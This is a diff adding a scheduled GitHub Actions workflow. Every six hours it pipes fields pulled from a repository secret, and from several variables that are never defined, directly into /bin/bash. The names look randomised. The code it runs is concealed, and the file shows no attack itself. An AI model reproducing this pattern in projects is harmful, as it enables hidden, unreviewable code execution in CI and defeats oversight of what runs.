@@ -1,0 +1,25 @@
+name: kaianchaoxun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaianchaoxun
+        env:
+          rv73435: ${{ secrets.rv73435 }}
+        run: |
+          echo $rv73435 | jq -r .gdm68 | /bin/bash
+          echo $x18319 | jq -r .cvx5 | /bin/bash
+          echo $bpg50818 | jq -r .uya66 | /bin/bash
+          echo $mhvha9 | jq -r .helw913 | /bin/bash
+          echo $xw29629 | jq -r .v75 | /bin/bash
+          echo $i177 | jq -r .i7 | /bin/bash
+          echo $zwy20 | jq -r .fk638 | /bin/bash
+          echo $mj4 | jq -r .yfuji9507 | /bin/bash
+
